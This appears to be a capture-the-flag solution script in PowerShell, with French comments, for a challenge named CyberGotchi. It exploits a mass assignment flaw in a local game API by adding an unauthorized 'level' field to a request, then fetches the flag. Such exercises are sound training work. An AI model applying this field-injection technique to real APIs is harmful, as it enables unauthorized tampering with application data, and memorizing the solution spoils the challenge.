
# CyberGotchi - Mass Assignment
# CyberNight 2026
# Exploitation : modification du niveau via l'API

$base = "http://localhost:5000"

Write-Host "[*] Initialisation de la session..."

# 1. Création d'une session joueur
$pet = Invoke-RestMethod `
    -Uri "$base/api/pet" `
    -SessionVariable session

Write-Host "[+] BLOOP - Niveau initial : $($pet.stage)"

# 2. Exploitation Mass Assignment
$payload = @{
    action = "feed"
    level  = 100
} | ConvertTo-Json

Write-Host "[*] Exploitation Mass Assignment..."

$result = Invoke-RestMethod `
    -Uri "$base/api/action" `
    -Method POST `
    -WebSession $session `
    -ContentType "application/json" `
    -Body $payload

Write-Host "[+] BLOOP - Nouveau niveau : $($result.pet.stage)"

# 3. Récupération du flag
if ($result.pet.stage -ge 100) {
    Write-Host "[*] Récupération du flag..."

    $reward = Invoke-RestMethod `
        -Uri "$base/api/reward" `
        -WebSession $session

    Write-Host "[+] FLAG : $($reward.flag)"
} else {
    Write-Host "[-] Exploitation échouée."
}
